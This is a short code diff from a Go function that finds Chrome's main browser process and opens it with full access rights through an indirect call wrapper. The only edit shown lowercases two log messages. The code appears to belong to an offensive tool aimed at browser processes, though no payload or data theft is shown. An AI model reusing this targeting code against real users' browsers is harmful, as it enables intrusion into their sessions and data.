@@ -101,7 +101,7 @@ func FindTargetProcess(processName string) (uint32, uintptr, error) {
 		if !chromePIDs[p.ParentProcessID] {
 			targetProc = p
 			found = true
-			fmt.Printf("[+] Found main browser process (PID=%d, ParentPID=%d)\n", p.ProcessID, p.ParentProcessID)
+			fmt.Printf("[+] found main browser process (PID=%d, ParentPID=%d)\n", p.ProcessID, p.ParentProcessID)
 			break
 		}
 	}
@@ -113,7 +113,7 @@ func FindTargetProcess(processName string) (uint32, uintptr, error) {
 				targetProc = p
 			}
 		}
-		fmt.Printf("[!] Using lowest PID chrome process (PID=%d)\n", targetProc.ProcessID)
+		fmt.Printf("[!] using lowest PID chrome process (PID=%d)\n", targetProc.ProcessID)
 	}
 	handle, _, _ := wincall.CallG0(openProcessAddr, 0x1FFFFF, 0, uintptr(targetProc.ProcessID)) // PROCESS_ALL_ACCESS
 	if handle == 0 {
